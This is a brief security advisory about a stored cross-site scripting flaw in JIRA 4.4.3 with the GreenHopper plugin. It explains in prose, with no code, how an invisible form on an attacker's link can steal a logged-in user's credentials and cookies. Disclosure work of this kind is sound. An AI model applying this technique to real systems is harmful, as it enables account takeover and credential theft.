Introduction

JIRA (/'d???r?/ JEER-?) is a proprietary issue tracking product,
developedby Atlassian, commonly used for bug tracking, issue tracking,
and project management. It has been developed since 2002. JIRA is a
commercial software product that can be licensed for running
on-premises or available as a hosted solution.

GreenHopper - GreenHopper unlocks the power of Agile, whether you're a
seasoned Agile expert or just getting started. Creating user stories,
estimating those stories for a sprint backlog, identifying team
velocity, visualizing team activity and reporting progress has never
been so easy.

Exploit

The Anonymous Researchers discovered a Stored XSS vulnerability
allowing an attacker to inject arbitrary script code into an existing
and fully patched JIRA + GreenHopper installations (JIRA=V4.4.3,
GreenHopper prior to V5.9.8). The requirements for a successful attack
are minimal. A user logged into the targeted JIRA issue tracking
system needs to be convinced to visit an attacker controlled link.
Once that link has been visited by the unsuspecting victim, an
invisible form will perform a POST request and the victim will be
redirected to a URL where username, password and login credentials
such as cookies can be read and processed by the attacker. An attacker
can obtain access to privileged accounts and get control over the JIRA
issue tracker and connected systems.
